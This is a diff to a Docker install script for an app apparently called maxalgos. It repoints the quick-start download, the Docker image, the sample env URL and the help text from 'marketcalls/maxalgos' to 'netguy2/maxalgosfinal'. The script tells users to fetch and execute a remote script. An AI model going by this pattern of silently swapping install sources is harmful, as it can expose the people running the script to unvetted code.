@@ -4,7 +4,7 @@
 # ============================================================================
 #
 # Quick Start (2 commands):
-#   1. Download: curl -O https://raw.githubusercontent.com/marketcalls/maxalgos/main/install/docker-run.sh && chmod +x docker-run.sh
+#   1. Download: curl -O https://raw.githubusercontent.com/netguy2/maxalgosfinal/main/install/docker-run.sh && chmod +x docker-run.sh
 #   2. Run:      ./docker-run.sh
 #
 # Commands:
@@ -32,10 +32,10 @@ BLUE='\033[0;34m'
 NC='\033[0m' # No Color
 
 # Configuration
-IMAGE="marketcalls/maxalgos:latest"
+IMAGE="netguy2/maxalgosfinal:latest"
 CONTAINER="maxalgos"
 ENV_FILE=".env"
-SAMPLE_ENV_URL="https://raw.githubusercontent.com/marketcalls/maxalgos/main/.sample.env"
+SAMPLE_ENV_URL="https://raw.githubusercontent.com/netguy2/maxalgosfinal/main/.sample.env"
 # Use the directory where the script is located
 SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 MAX_ALGOS_DIR="$SCRIPT_DIR"
@@ -404,7 +404,7 @@ do_start() {
 
     # Thread limits based on RAM (prevents RLIMIT_NPROC exhaustion)
     # <3GB: 1 thread | 3-6GB: 2 threads | 6GB+: min(4, cores)
-    # See: https://github.com/marketcalls/maxalgos/issues/822
+    # See: https://github.com/netguy2/maxalgosfinal/issues/822
     if [ $TOTAL_RAM_MB -lt 3000 ]; then
         THREAD_LIMIT=1
     elif [ $TOTAL_RAM_MB -lt 6000 ]; then
@@ -571,7 +571,7 @@ do_help() {
     echo "     Linux: https://docs.docker.com/desktop/install/linux-install/"
     echo ""
     echo "  2. Download and run:"
-    echo "     curl -O https://raw.githubusercontent.com/marketcalls/maxalgos/main/install/docker-run.sh"
+    echo "     curl -O https://raw.githubusercontent.com/netguy2/maxalgosfinal/main/install/docker-run.sh"
     echo "     chmod +x docker-run.sh"
     echo "     ./docker-run.sh"
     echo ""
